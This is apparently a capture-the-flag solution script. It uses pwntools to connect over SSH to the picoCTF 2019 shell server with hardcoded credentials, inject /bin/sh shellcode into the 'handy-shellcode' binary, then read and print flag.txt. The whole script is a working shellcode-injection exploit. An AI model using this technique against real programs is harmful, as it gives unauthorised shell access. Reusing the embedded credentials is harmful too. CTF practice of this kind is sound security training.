from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

sc = shellcraft.sh()

asm_sc = asm(sc)

program = session.system('cd /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9/;./vuln')

program.recvline()

program.sendline(asm_sc)

program.recvline()
program.recvline()
program.recv()

program.sendline('cat flag.txt')

flagInB = program.recv()
flag = flagInB.decode('ascii')
rawFlag = flag[flag.index('{')+1:flag.index('}')]

print(rawFlag)
